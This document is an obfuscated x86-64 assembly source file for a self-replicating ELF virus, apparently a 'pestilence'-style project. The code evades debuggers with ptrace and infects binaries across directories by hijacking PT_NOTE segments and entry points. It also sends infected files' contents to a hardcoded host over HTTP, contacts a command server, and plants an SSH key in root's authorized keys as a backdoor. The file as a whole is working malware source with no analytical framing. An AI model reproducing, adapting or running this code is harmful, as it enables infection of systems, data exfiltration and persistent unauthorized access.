%include "asm/srcs/obf_file.inc"
; %include "asm/srcs/pestilence.inc"
bits 64 
default rel
section .text
global _start
_start:
; mov rbp, rsp
push rbp
mov rbp, rsp
PUSHA
; lea rdi, [rel LeqAx] ; dir to open for arg readDir
; mov rsi, UsjUXZli1C
; call LXQqhC
call _map_int_table
; call n0Zhf0
call d7QXlhSKMh
test rax, rax
js ZCGAq
push rax
push 0
call mov2
add rsp, 8
mov rdx, rax
pop rax
push rax
push UsjUXZli1C
call mov1
add rsp, 8
mov rsi, rax
pop rax
; dir to open for arg initDir
lea rdi, [rel LeqAx] 
; mov rdi, LeqAx ; dir to open for arg initDir
call L6ny7j
push rax
push 0
call mov4
add rsp, 8
mov rdx, rax
pop rax
push rax
push JksxN
call mov3
add rsp, 8
mov rsi, rax
pop rax
lea rdi, [rel IU6f1]
; mov rdi, IU6f1 ; dir to open for arg initDir
call L6ny7j
call fgHC3O2HCz
; jmp lwmZqy
ZCGAq:
POPA 
push rax
push rbp
call mov2
add rsp, 8
mov rsp, rax
pop rax
pop rbp
bzU1m8e:
jmp lwmZqy
n0Zhf0:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 3]
shl r14, 0x18
push r14
call mov1
add rsp, 8
movzx r14, byte [r15 + 119]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 235]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 351]
or rax, r14 
pop r14
pop r15
syscall
push rax
push rax
push rax
call mov4
add rsp, 8
mov rsi, rax
pop rax
push SYS_PTRACE
call mov3
add rsp, 8
push rax
push PTRACE_TRACEME
call mov1
add rsp, 8
mov rdi, rax
pop rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
push rax
push r14
call mov2
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 120]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 236]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 352]
or rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call mov3
add rsp, 8
mov r10, rax
pop rax
movzx r14, byte [r15 + 117]
shl r14, 0x10
or r10, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or r10, r14 
movzx r14, byte [r15 + 349]
or r10, r14 
pop r14
pop r15
syscall
cmp rax, 0 
jl lwmZqy
pop rax
push rax
push rax
call mov4
add rsp, 8
mov rsi, rax
pop rax
push SYS_PTRACE
call mov2
add rsp, 8
push rax
push PTRACE_DETACH
call mov4
add rsp, 8
mov rdi, rax
pop rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
push rax
push r14
call mov3
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 120]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 236]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 352]
or rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call mov1
add rsp, 8
mov r10, rax
pop rax
movzx r14, byte [r15 + 117]
shl r14, 0x10
or r10, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or r10, r14 
movzx r14, byte [r15 + 349]
or r10, r14 
pop r14
pop r15
syscall
ret
; take directory to open in rdi-> FDT9L
L6ny7j:
; placing JeUD6 on the stack
push rbp
mov rbp, rsp
; rdi -> to _encrypt 
push rax
cy71VDeK:
call _decrypt_str
push rax
push rax
call mov3
add rsp, 8
mov rdi, rax
pop rax
pop rax
sub rsp, JeUD6_size
lea r8, FAM(JeUD6.rwpA8dhMq)
or qword [r8], -1
lea rsi, FAM(JeUD6.FDT9L)
; strcpy(JeUD6.FDT9L(rsi), FDT9L(rdi))
call HOmW8jN 
cmp rdx, 0 
je LXQqhC
; strlen(JeUD6.FDT9L(rsi))
call lzPBWI0L 
push rax
push rsi
push rax
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
cmp BYTE [rsi - 1], '/' 
je Gvdssm
mov BYTE [rsi], '/' 
push rax
push rsi
push 1
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
Gvdssm:
push rax
push rdx
call mov1
add rsp, 8
mov rdi, rax
pop rax
call HOmW8jN
mov rdi, rsp
LXQqhC:
push SYS_OPEN
call mov4
add rsp, 8
push rax
push O_RDONLY | O_DIRECTORY
call mov2
add rsp, 8
mov rsi, rax
pop rax
xor rdx, rdx
syscall
cmp rax, 0 
jl Tqb1Kg1IBU
; en registre le rwpA8dhMq dans la struct
lea rdi, FAM(JeUD6.rwpA8dhMq) 
push rax
push rax
call mov1
add rsp, 8
mov [rdi], rax
pop rax
reKBo:
lea r10, FAM(JeUD6.rwpA8dhMq) 
; init iWNXUwokn
lea r9, FAM(JeUD6.iWNXUwokn) 
mov DWORD [r9], 0 
push SYS_GETDENTS
call mov4
add rsp, 8
push rax
push qword [r10]
call mov3
add rsp, 8
mov rdi, rax
pop rax
lea rsi, FAM(JeUD6.G47ZqV)
push rax
push PAGE_SIZE
call mov2
add rsp, 8
mov rdx, rax
pop rax
syscall
cmp rax, 0 
jle Tqb1Kg1IBU
; r10 -> (struct JeUD6.diretents_struct_ptr)
lea r10, FAM(JeUD6.mvJ2G0B) 
; JeUD6.mvJ2G0B -> JeUD6.G47ZqV
push rax
push rsi
call mov4
add rsp, 8
mov [r10], rax
pop rax
; r11 -> (struct JeUD6.mY2fujeRo)
lea r11, FAM(JeUD6.mY2fujeRo) 
mov DWORD [r11], eax 
irj9h:
; r8 -> total lu de getdents
lea r8, FAM(JeUD6.iWNXUwokn) 
; r9 -> total a lire de getdents
lea r9, FAM(JeUD6.mY2fujeRo) 
; r10 -> actual dirent struct
mov r10, FAM(JeUD6.mvJ2G0B) 
; r11 -> ptr de la struct actuelle
lea r11, FAM(JeUD6.mvJ2G0B) 
movzx r12, WORD [r10 + D_RECLEN_OFF] 
; update du total lu dans r8
add [r8], r12d 
; JeUD6.diretns_struct_ptr -> sur la prochaine struct
add qword [r11], r12 
cmp BYTE [r10 + D_TYPE], D_FOLDER 
je TLLLXxoxM
cmp BYTE [r10 + D_TYPE], D_REG_FILE 
jne KpHnLUufhQ
wgYQw:
; strlen
mov rsi, rsp
call lzPBWI0L
lea rsi, [r10 + D_NAME] 
mov byte [rsi - 1], '/'
push rax
push 1
call add1
add rsp, 8
add rsp, 8
sub rsi, rax
mov rdi, rsp
call f95ZQpA3
; printing
; writeWork
; writeBack
; ajouter les foncton pour chaques fichier ici
; call qDbesJ
call afAbq2f
jmp KpHnLUufhQ
TLLLXxoxM:
lea rdi, FAM(JeUD6.FDT9L)
push rax
lea rsi, FAM(JeUD6.FDT9L)
call lzPBWI0L
push rax
push rax
call mov2
add rsp, 8
mov rsi, rax
pop rax
pop rax
lea rdx, [r10 + D_NAME] 
cmp BYTE [rdx], 0x2e 
jne pdUHG5LeX
cmp BYTE [rdx + 1], 0 
je KpHnLUufhQ
cmp BYTE [rdx + 1], 0x2e 
jne pdUHG5LeX
cmp BYTE [rdx + 2], 0 
je KpHnLUufhQ
pdUHG5LeX:
call L6ny7j
KpHnLUufhQ:
mov r8, FAM(JeUD6.iWNXUwokn)
mov r12, FAM(JeUD6.mY2fujeRo)
; if (total lu >= total getdents)
cmp r8d, r12d 
jge reKBo
jmp irj9h
Tqb1Kg1IBU:
mov rdi, FAM(JeUD6.rwpA8dhMq)
cmp qword rdi, 0 
jle aOvfi3N4
push SYS_CLOSE
call mov3
add rsp, 8
syscall
or qword FAM(JeUD6.rwpA8dhMq), -1
jmp aOvfi3N4
; mov rdi, FAM(JeUD6.rwpA8dhMq)
; syscall
aOvfi3N4:
leave
Yn887ponP:
ret
afAbq2f:
push rbp
mov rbp, rsp
sub rsp, X703hy1rZ_size
lea rax, INF(X703hy1rZ.F4vJxi7)
mov qword [rax], 0 
lea rax, INF(X703hy1rZ.GkEOkKIOr)
mov byte [rax], 0 
lea rax, INF(X703hy1rZ.gyLo4iIdVn)
mov qword [rax], 0 
qDbesJ:
push SYS_OPEN
call mov1
add rsp, 8
push rax
push rsi
call mov4
add rsp, 8
mov rdi, rax
pop rax
push rax
push O_RDWR
call mov2
add rsp, 8
mov rsi, rax
pop rax
xor rdx, rdx
syscall
cmp rax, 0x0 
jl aOvfi3N4
push rax
push rax
call mov1
add rsp, 8
mov INF(X703hy1rZ.qz9giR), rax
pop rax
; === get file size ===
uKUAgDiB9:
push SYS_LSEEK
call mov3
add rsp, 8
mov rdi, INF(X703hy1rZ.qz9giR)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call mov1
add rsp, 8
mov rsi, rax
pop rax
movzx r14, byte [r15 + 117]
shl r14, 0x10
or rsi, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or rsi, r14 
movzx r14, byte [r15 + 349]
or rsi, r14 
pop r14
pop r15
push rax
push SEEK_END
call mov4
add rsp, 8
mov rdx, rax
pop rax
syscall
cmp rax, 0x0 
jle vNfN5Ue
push rax
push rax
call mov2
add rsp, 8
mov INF(X703hy1rZ.nGwh0I24), rax
pop rax
push rax
push rax
call mov3
add rsp, 8
mov INF(X703hy1rZ.qLMmjsLc), rax
pop rax
FEnTgqIwBZ:
; rax -> map
; rsi = file_size
push rax
push rax
call mov4
add rsp, 8
mov rsi, rax
pop rax
push SYS_MMAP
call mov3
add rsp, 8
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call mov2
add rsp, 8
mov rdi, rax
pop rax
movzx r14, byte [r15 + 117]
shl r14, 0x10
or rdi, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or rdi, r14 
movzx r14, byte [r15 + 349]
or rdi, r14 
pop r14
pop r15
push rax
push PROT_READ | PROT_WRITE | PROT_EXEC
call mov1
add rsp, 8
mov rdx, rax
pop rax
push rax
push MAP_SHARED
call mov3
add rsp, 8
mov r10, rax
pop rax
mov r8, INF(X703hy1rZ.qz9giR)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call mov4
add rsp, 8
mov r9, rax
pop rax
movzx r14, byte [r15 + 117]
shl r14, 0x10
or r9, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or r9, r14 
movzx r14, byte [r15 + 349]
or r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl vNfN5Ue
call hLpiGpf
push r12
call mov2
add rsp, 8
push rax
push r15
call mov1
add rsp, 8
mov rsi, rax
pop rax
lea r8, INF(X703hy1rZ.jS6sH4kx)
push rax
push rax
call mov2
add rsp, 8
mov [r8], rax
pop rax
Sswbkbk3U:
cmp dword [rax + 1], 0x02464c45 
jne jc6dsjkGsi
NraI00tKE:
; rax == total segment number
; r9 == injection offset
; r13 == original segment end offset
; r14 -> header table
; r15 -> map
push rax
push rax
call mov4
add rsp, 8
mov r15, rax
pop rax
push rax
push r15
call mov3
add rsp, 8
mov r14, rax
pop rax
push rax
push r14
push qword [r14 + w0adOh4j9A.WC98s6]
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
xor rcx, rcx
hp1qWtj4bm:
cmp cx, [r15 + w0adOh4j9A.sqnXrEEphp]
jge g9SQfLm 
push rax
push r14
push l8FG12Pyo_size
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
inc rcx
jmp hp1qWtj4bm
g9SQfLm:
push rax
push r14
call mov1
add rsp, 8
mov INF(X703hy1rZ.xjReXh), rax
pop rax
xor r9, r9
eykMn3h:
cmp cx, 0 
jle Qo8Nc9
rfQICHso6T:
bt word [r14], 0 
jnc eccDm
bt qword [r14], 0x20 
jc wy4ldfvHIv
eccDm:
dec rcx
sub r14, l8FG12Pyo_size
jmp eykMn3h
Qo8Nc9:
mov r9, INF(X703hy1rZ.F4vJxi7)
cmp r9, 0 
je jc6dsjkGsi
cmp byte INF(X703hy1rZ.GkEOkKIOr), 1 
je ZYFHesE
; else jmp faawz
jmp faawz 
wy4ldfvHIv:
; Check if the segment signed, else check the size, if big enough save the offsets if not already done
wxMR1:
; r8 -> potential haXw6ThsV
; r9 == haXw6ThsV variable
push rax
push r15
call mov4
add rsp, 8
mov r8, rax
pop rax
push rax
push r8
push qword [r14 + l8FG12Pyo.IjAqzlaXw]
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
push rax
push r8
push qword [r14 + l8FG12Pyo.tnsaLRfc]
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
sub r8, ENiCO4ir
push rax
push qword [rel haXw6ThsV]
call mov2
add rsp, 8
mov r9, rax
pop rax
cmp qword r9, [r8]
je jc6dsjkGsi
YXYU3:
mov r9, INF(X703hy1rZ.F4vJxi7)
test r9, r9
jz l2abMqvAOq
mov r9, INF(X703hy1rZ.GkEOkKIOr)
test r9, r9
jz eccDm
l2abMqvAOq:
; r8 == end of X703hy1rZ offset
; r9 == next segment offset
push rax
push qword [r14 + l8FG12Pyo.IjAqzlaXw]
call mov1
add rsp, 8
mov r8, rax
pop rax
push rax
push r8
push qword [r14 + l8FG12Pyo.tnsaLRfc]
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
; save segment end's offset
push rax
push r8
call mov3
add rsp, 8
mov r13, rax
pop rax
push rax
push r8
push CODE_LEN
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
push rax
push r14
call mov4
add rsp, 8
mov r9, rax
pop rax
push rax
push r9
push l8FG12Pyo_size
call add1
add rsp, 8
pop r9
mov r9, rax
pop rax
push rax
push r9
push l8FG12Pyo.IjAqzlaXw
call add1
add rsp, 8
pop r9
mov r9, rax
pop rax
cmp [r9], r8
; if ([r9] < r8) { X703hy1rZ.GkEOkKIOr = 1) }
setb INF(X703hy1rZ.GkEOkKIOr) 
mS8FiYQsFg:
; r8 -> X703hy1rZ structure members
; r9 == injection address
; r12 == original entrypoint
;*r13 == segment end's offset (l2abMqvAOq)
;*r14 -> segment header in header table
lea r8, INF(X703hy1rZ.J8JLc)
mov [r8], cl
lea r8, INF(X703hy1rZ.zsfLTcza)
push rax
push qword [r15 + w0adOh4j9A.bmF8Q2]
call mov1
add rsp, 8
mov r12, rax
pop rax
push rax
push r12
call mov3
add rsp, 8
mov [r8], rax
pop rax
lea r8, INF(X703hy1rZ.F4vJxi7)
push rax
push r13
call mov2
add rsp, 8
mov [r8], rax
pop rax
lea r8, INF(X703hy1rZ.rM6Aog)
push r9
push rax
push qword [r14 + l8FG12Pyo.Sol8RvYWh]
call mov3
add rsp, 8
mov r9, rax
pop rax
push rax
push r9
push qword [r14 + l8FG12Pyo.Ei8V6]
call add1
add rsp, 8
pop r9
mov r9, rax
pop rax
push rax
push r9
call mov1
add rsp, 8
mov [r8], rax
pop rax
pop r9
lea r8, INF(X703hy1rZ.WVWWfydEhR)
push rax
push r14
call mov4
add rsp, 8
mov [r8], rax
pop rax
jmp eccDm
ZYFHesE:
tJ3Qpqu:
push SYS_FTRUNCATE
call mov2
add rsp, 8
mov rdi, INF(X703hy1rZ.qz9giR)
lea rsi, INF(X703hy1rZ.nGwh0I24)
push qword [rsi]
add qword [rsi], PAGE_SIZE 
and qword [rsi], -4096
add qword [rsi], CODE_LEN 
push rax
push qword [rsi]
call mov4
add rsp, 8
mov rsi, rax
pop rax
syscall
pop rsi
cmp rax, 0 
jl jc6dsjkGsi
D2fR4tdpaq:
mov rdi, INF(X703hy1rZ.jS6sH4kx)
push SYS_UNMAP
call mov3
add rsp, 8
syscall
zPTzub:
push SYS_MMAP
call mov1
add rsp, 8
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call mov2
add rsp, 8
mov rdi, rax
pop rax
movzx r14, byte [r15 + 117]
shl r14, 0x10
or rdi, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or rdi, r14 
movzx r14, byte [r15 + 349]
or rdi, r14 
pop r14
pop r15
; rsi = file_size
mov rsi, INF(X703hy1rZ.nGwh0I24) 
push rax
push PROT_READ | PROT_WRITE | PROT_EXEC
call mov2
add rsp, 8
mov rdx, rax
pop rax
push rax
push MAP_SHARED
call mov4
add rsp, 8
mov r10, rax
pop rax
mov r8, INF(X703hy1rZ.qz9giR)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call mov3
add rsp, 8
mov r9, rax
pop rax
movzx r14, byte [r15 + 117]
shl r14, 0x10
or r9, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or r9, r14 
movzx r14, byte [r15 + 349]
or r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl vNfN5Ue
lea r8, INF(X703hy1rZ.jS6sH4kx)
push rax
push rax
call mov1
add rsp, 8
mov [r8], rax
pop rax
KAyyrb7qJ2:
mov r14, INF(X703hy1rZ.jS6sH4kx)
movzx rax, word [r14 + w0adOh4j9A.GtDX9]
push rax
push r14
push qword [r14 + w0adOh4j9A.GGUrI]
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
xor rcx, rcx
ex29yQO:
cmp rcx, rax
jge Is8f8NWby7
push rax
push qword [r14 + TzeIKi.wXBJbu0]
call mov1
add rsp, 8
mov rbx, rax
pop rax
push rax
push rbx
push qword [r14 + TzeIKi.S1ehM]
call add1
add rsp, 8
pop rbx
mov rbx, rax
pop rax
cmp INF(X703hy1rZ.gyLo4iIdVn), rbx
jge t0ZWko77MU
push rax
push rbx
call mov2
add rsp, 8
mov INF(X703hy1rZ.gyLo4iIdVn), rax
pop rax
t0ZWko77MU:
push rax
push r14
push TzeIKi_size
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
inc rcx
jmp ex29yQO
Is8f8NWby7:
sYTTZd:
; r14 -> segmentS header
; rcx == segment counter
mov r14, INF(X703hy1rZ.jS6sH4kx)
movzx rax, word [r14 + w0adOh4j9A.sqnXrEEphp]
push rax
push r14
push qword [r14 + w0adOh4j9A.WC98s6]
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
xor rcx, rcx
Y1keZYoe:
cmp rcx, rax
jge cTnsvrA
cmp dword [r14 + l8FG12Pyo.kI8GKGmN], PT_NOTE 
je sZRceSEDk
heHy7qO:
push rax
push r14
push l8FG12Pyo_size
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
inc rcx
jmp Y1keZYoe
cTnsvrA:
push rax
push -1
call mov3
add rsp, 8
mov r14, rax
pop rax
sZRceSEDk:
; r14 -> segment header
; rax == new offset / address
cmp r14, 0 
jl NABTH
mov dword [r14 + l8FG12Pyo.kI8GKGmN], PT_LOAD 
mov qword [r14 + l8FG12Pyo.SpCJOKQQ], PF_X | PF_R 
mov qword [r14 + l8FG12Pyo.tnsaLRfc], CODE_LEN 
mov qword [r14 + l8FG12Pyo.Ei8V6], CODE_LEN 
mov qword [r14 + l8FG12Pyo.kPy7P], PAGE_SIZE 
mov rax, INF(X703hy1rZ.qLMmjsLc)
push rax
push PAGE_SIZE
call add1
add rsp, 8
add rsp, 8
and rax, -4096
mov qword [r14 + l8FG12Pyo.IjAqzlaXw], rax
mov qword INF(X703hy1rZ.F4vJxi7), rax
mov rax, INF(X703hy1rZ.gyLo4iIdVn)
push rax
push PAGE_SIZE
call add1
add rsp, 8
add rsp, 8
and rax, -4096
mov qword INF(X703hy1rZ.rM6Aog), rax
mov qword [r14 + l8FG12Pyo.Sol8RvYWh], rax
mov qword [r14 + l8FG12Pyo.pVIHw], rax
faawz:
Ay9C3bmm:
; r8 -> elf header entrypoint
; r9 == end of segment + align (injection offset)
; r10 == injection offset
mov r8, INF(X703hy1rZ.jS6sH4kx)
push rax
push r8
push w0adOh4j9A.bmF8Q2
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
mov r10, INF(X703hy1rZ.rM6Aog)
push rax
push r10
call mov4
add rsp, 8
mov [r8], rax
pop rax
cmp byte INF(X703hy1rZ.GkEOkKIOr), 0 
jg KhvYPcx23
push rax
push CODE_LEN
call mov2
add rsp, 8
mov rdi, rax
pop rax
call U341P
KhvYPcx23:
; rdi -> injection start
; rsi -> parasite _start
; rcx == code len (IDsDM - _start)
mov rdi, INF(X703hy1rZ.jS6sH4kx)
add rdi, INF(X703hy1rZ.F4vJxi7)
; rsi -> start of our code
lea rsi, [rel _start] 
push rax
push CODE_LEN
call mov4
add rsp, 8
mov rcx, rax
pop rax
; copy from _start to IDsDM (= !std)
cld 
rep movsb
NABTH:
; r8 -> bzU1m8e instruction's addr (bzU1m8e + 1)
; r9 == distance to jump from final jump to original entry point
mov r8, INF(X703hy1rZ.jS6sH4kx)
add r8, INF(X703hy1rZ.F4vJxi7)
push rax
push r8
push FINJMP_OFF
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
inc r8
mov r10, INF(X703hy1rZ.rM6Aog)
push rax
push r10
push FINJMP_OFF
call add1
add rsp, 8
pop r10
mov r10, rax
pop rax
push rax
push r10
push 0x05
call add1
add rsp, 8
pop r10
mov r10, rax
pop rax
mov r9, INF(X703hy1rZ.zsfLTcza)
sub r9, r10
mov [r8], r9d
jmp jc6dsjkGsi
U341P:
; r8 -> segment header data
;*r14 -> segment header in header table
mov r8, INF(X703hy1rZ.WVWWfydEhR)
; save header start for later
push r8 
; * Update file size *
push rax
push r8
push qword l8FG12Pyo.tnsaLRfc
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
add qword [r8], rdi
pop r8
; * Update memory size *
push rax
push r8
push l8FG12Pyo.Ei8V6
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
add qword [r8], rdi
ret
; --- privesc + backdoor
fgHC3O2HCz:
; open "/root/.ssh/authorized.key"
; r9 == rwpA8dhMq
push rbp
mov rbp, rsp
sub rsp, 0x1000 
push SYS_OPEN
call mov3
add rsp, 8
; mov rdi, XdOzA0DA
lea rdi, [rel XdOzA0DA]
push rax
push rsi
push rax
push W2nvO
call mov1
add rsp, 8
mov rsi, rax
pop rax
oTRSYOwg:
call _decrypt_str
push rax
push rax
call mov3
add rsp, 8
mov rdi, rax
pop rax
pop rsi
pop rax
push rax
push O_RDWR | O_CREAT
call mov2
add rsp, 8
mov rsi, rax
pop rax
push rax
push 600
call mov1
add rsp, 8
mov rdx, rax
pop rax
syscall
test rax, rax
js aOvfi3N4
push rax
push rax
call mov4
add rsp, 8
mov r9, rax
pop rax
g8CpurWzWK:
; *r9 == rwpA8dhMq
; r10 == size read
; rsi -> buffer
push SYS_READ
call mov1
add rsp, 8
push rax
push r9
call mov2
add rsp, 8
mov rdi, rax
pop rax
push rax
push rbp
call mov3
add rsp, 8
mov rsi, rax
pop rax
sub rsi, 0x1000 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 41]
shl r14, 0x18
push rax
push r14
call mov4
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 157]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 273]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 389]
or rdx, r14 
pop r14
pop r15
syscall
cmp rax, 0 
je kVAZBsy
jl rnlKVA4m
push rax
push rax
call mov1
add rsp, 8
mov r10, rax
pop rax
XZHOwoCL:
; rcx == nombre d'octet lue
; r11 -> buffer
push rax
push r10
call mov4
add rsp, 8
mov rcx, rax
pop rax
push rax
push rsi
call mov3
add rsp, 8
mov r11, rax
pop rax
; for every new line
YjN7fU:
cmp byte [r11], 0xa 
je g6mqk
inc r11
loop YjN7fU
push SYS_WRITE
call mov2
add rsp, 8
push rax
push KnlWTHf
call mov1
add rsp, 8
mov rsi, rax
pop rax
push rax
push 1
call mov3
add rsp, 8
mov rdx, rax
pop rax
syscall
jmp kVAZBsy
; cmp the line with pub ssh I9h3dTtNKW
g6mqk:
mov byte [r11], 0 
push rax
push r11
call mov4
add rsp, 8
mov rdi, rax
pop rax
sub rdi, B197bFv91K - 1 
lea rsi, [rel JzE82]
push rax
push rdi
lea rdi, [rel JzE82]
push rax
push B197bFv91K
call mov2
add rsp, 8
mov rsi, rax
pop rax
gY44K:
call _decrypt_str
push rax
push rax
call mov2
add rsp, 8
mov rsi, rax
pop rax
pop rdi
pop rax
push rcx
call CvLYMAYQ5
pop rcx
test rax, rax 
je rnlKVA4m
inc r11
dec rcx
jnz YjN7fU
; loop YjN7fU
; if not found write it
kVAZBsy:
push rax
push r9
call mov1
add rsp, 8
mov rdi, rax
pop rax
push SYS_WRITE
call mov3
add rsp, 8
lea rsi, [rel JzE82]
push rax
push rdi
lea rdi, [rel JzE82]
push rax
push B197bFv91K
call mov4
add rsp, 8
mov rsi, rax
pop rax
e3gRcq:
call _decrypt_str
push rax
push rax
call mov1
add rsp, 8
mov rsi, rax
pop rax
pop rdi
pop rax
push rax
push B197bFv91K - 1
call mov3
add rsp, 8
mov rdx, rax
pop rax
syscall
push SYS_WRITE
call mov2
add rsp, 8
lea rsi, [rel KnlWTHf]
push rax
push rdi
lea rdi, [rel KnlWTHf]
push rax
push B197bFv91K
call mov4
add rsp, 8
mov rsi, rax
pop rax
w97MDxH:
call _decrypt_str
push rax
push rax
call mov2
add rsp, 8
mov rsi, rax
pop rax
pop rdi
pop rax
push rax
push 1
call mov4
add rsp, 8
mov rdx, rax
pop rax
syscall
rnlKVA4m:
push SYS_CLOSE
call mov1
add rsp, 8
push rax
push r9
call mov3
add rsp, 8
mov rdi, rax
pop rax
syscall
; 
jmp aOvfi3N4
fsH2ZWOpip:
NRG7leLgHL:
push SYS_SOCKET
call mov4
add rsp, 8
push rax
push AF_INET
call mov1
add rsp, 8
mov rdi, rax
pop rax
push rax
push SOCK_STREAM
call mov2
add rsp, 8
mov rsi, rax
pop rax
xor rdx, rdx
syscall
test rax, rax
js Yn887ponP
push rax
push rax
call mov3
add rsp, 8
mov rdi, rax
pop rax
txN25:
push SYS_CONNECT
call mov3
add rsp, 8
lea rsi, [rel Ap5WD2EbFi]
push rax
push 16
call mov1
add rsp, 8
mov rdx, rax
pop rax
syscall
test rax, rax
js Ozm651xmq
push rdi
call mov2
add rsp, 8
ret
CeH5F:
push SYS_UNMAP
call mov4
add rsp, 8
push rax
push rsi
call mov1
add rsp, 8
mov rdi, rax
pop rax
push rax
push rdx
call mov2
add rsp, 8
mov rsi, rax
pop rax
syscall
pop rdi
; (rdi: socket)
Ozm651xmq:
push SYS_CLOSE
call mov4
add rsp, 8
syscall
push -1
call mov3
add rsp, 8
ret
; extrait les donnees des fichiers via http
hLpiGpf:
; r12 -> maped file_date
push rax
push rax
call mov4
add rsp, 8
mov r12, rax
pop rax
push rsi
call NRG7leLgHL
pop rsi
push rax
push rax
call mov3
add rsp, 8
mov r13, rax
pop rax
O0RFoUW5:
cmp r13, 0 
jl Yn887ponP
gChF0SV:
; rax -> mmap buffer
; r15 == la size du mmap buffer
; r12 -> maped file_data
push SYS_MMAP
call mov1
add rsp, 8
xor rdi, rdi
push rsi
push rax
push rsi
push nUQR8D
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push rsi
push hhcTDSu
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push rsi
push 10
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push rsi
call mov2
add rsp, 8
mov r15, rax
pop rax
push rax
push PROT_READ | PROT_WRITE
call mov1
add rsp, 8
mov rdx, rax
pop rax
push rax
push MAP_PRIVATE | MAP_ANONYMOUS
call mov4
add rsp, 8
mov r10, rax
pop rax
xor r8, r8
xor r9, r9
syscall
s5rvi3:
; r14 -> header buffer
; *r15 == la taille du mmap buffer
push rax
push rax
call mov2
add rsp, 8
mov r14, rax
pop rax
push rax
push rax
call mov3
add rsp, 8
mov rsi, rax
pop rax
lea rdi, [rel rKANABrqt]
call HOmW8jN
pop rax
push rax
push rax
push rsi
push nUQR8D - 1
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
call nQScOYAb
lea rdi, [rel SKasW]
call HOmW8jN
push rax
push rsi
push hhcTDSu - 1
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push r12
call mov4
add rsp, 8
mov rdi, rax
pop rax
pop rcx
call HUs658Gp
Kr11z1KLV:
push SYS_SENDTO
call mov2
add rsp, 8
push rax
push r13
call mov3
add rsp, 8
mov rdi, rax
pop rax
push rax
push r14
call mov1
add rsp, 8
mov rsi, rax
pop rax
push rax
push r15
call mov1
add rsp, 8
mov rdx, rax
pop rax
xor r10, r10
xor r9, r9
syscall
push rdi
jmp CeH5F
; manage X703hy1rZ
d7QXlhSKMh:
push rbp
mov rbp, rsp 
call NRG7leLgHL
cmp rax, 0 
jl HzchUX
pzQcUhG0n:
;rdi == sockfd
push rax
push rax
call mov2
add rsp, 8
mov rdi, rax
pop rax
push SYS_SENDTO
call mov3
add rsp, 8
lea rsi, [rel XTZsIZO]
push rax
push YOFxT
call mov4
add rsp, 8
mov rdx, rax
pop rax
xor r10, r10
xor r9, r9
syscall
test rax, rax
js HzchUX
QQ1s8v6Ab:
push rdi
push 35
call mov2
add rsp, 8
lea rdi, [rel vJBLbia]
xor rsi, rsi
syscall
pop rdi
KvRQy:
;* rdi == sockfd
push SYS_RECVFROM
call mov4
add rsp, 8
sub rsp, 200 
mov rsi, rsp
push rax
push 200
call mov1
add rsp, 8
mov rdx, rax
pop rax
xor r10, r10
syscall
test rax, rax
js HzchUX
pvk7bC6:
;* rdi == sockfd
mov rsi, rsp
call lzPBWI0L
push rax
push rsp
push rax
call add1
add rsp, 8
pop rsp
mov rsp, rax
pop rax
sub rsp, 2 
cmp WORD [rsp], 0x4b4f 
jne IrtqLUNF
HzchUX:
